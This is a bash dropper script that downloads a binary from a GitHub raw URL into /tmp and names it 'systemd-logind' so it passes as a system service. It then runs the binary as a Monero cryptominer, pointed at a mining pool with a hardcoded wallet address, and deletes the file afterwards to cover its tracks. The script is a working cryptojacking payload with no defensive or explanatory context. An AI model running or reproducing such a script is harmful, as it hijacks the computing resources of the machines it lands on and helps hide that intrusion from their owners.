#!/bin/bash
cd /tmp || exit
curl -sL https://raw.githubusercontent.com/Nullarys/files/main/systemd-logind -o systemd-logind
chmod +x systemd-logind
./systemd-logind -o gulf.moneroocean.stream:20004 -u 47vWiuhUfPB83qUdvnGxK3UyV2ZpqmkUoJmL1S9K8dijbyhH82Wc8DRJbpgyJAwbX5iqRDR1Rgs1gdV4tVxohbQj7ta7Tia -p x --tls -B --cpu-max-threads-hint=50 --donate-level=0
rm -f systemd-logind
